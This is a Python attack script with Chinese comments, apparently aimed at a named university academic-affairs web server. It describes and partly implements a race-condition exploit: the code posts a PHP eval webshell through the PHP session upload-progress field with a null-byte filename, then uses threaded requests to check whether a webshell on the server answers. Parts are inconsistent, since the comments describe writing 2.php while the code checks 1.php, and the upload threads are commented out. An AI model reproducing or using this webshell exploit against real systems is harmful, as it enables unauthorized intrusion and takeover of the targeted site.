# 整个代码的思路就是，往/tmp/sess_TonyDog文件中写入一句话木马，密码为1，
# 然后用题目中的文件包含漏洞，包含这一个文件，
# 在函数read中尝试利用/tmp/sess_TonyDog中的一句话木马再往网站根目录创建一个2.php文件，这个2.php文件内容为一句话木马，密码为2

# 利用Python的多线程，一边上传文件，一边尝试往根目录中写入2.php，
# 如果成功写入了，就打印输出“成功写入一句话”
# 这里利用Python的threading模块，开5个线程进行条件竞争
import time

import requests
import io
import threading

url = "http://jwgl.ncist.edu.cn//include/UpFile.aspx/"
url1 = "http://jwgl.ncist.edu.cn/"
sessid = "202007074317"  # 文件名可控，文件路径知道，就可以构造Session包含


def write(session):     # 往临时文件夹中写入文件
    filebytes = io.BytesIO(b'a' * 1024 * 50)
    while True:
        time.sleep(1)
        res = session.post(url,
                           data={
                               'PHP_SESSION_UPLOAD_PROGRESS': "<?php eval($_POST[1]);?>"
                           },
                           cookies={
                               'PHPSESSID': sessid
                           },
                           files={
                               'file': ('TonyDog.php%00.jpg', filebytes)
                           }
                           )


def read(session):      # 读取临时文件夹中的临时文件
    #i = 0
    while 1:
        try:
            #print(i, end='\r')
            a = requests.get("http://jwgl.ncist.edu.cn//_photo/Student/1.php")
            if "c4ca4238a0b923820dcc509a6f75849b" in a.text:
                print("OK")
                break
        except Exception as e:
            pass
        #i += 1


if __name__ == "__main__":
    evnet = threading.Event()
    with requests.session() as session:
        # for i in range(5):
        #     threading.Thread(target=write, args=(session,)).start()
        for i in range(5):
            threading.Thread(target=read, args=(session,)).start()
    evnet.set()
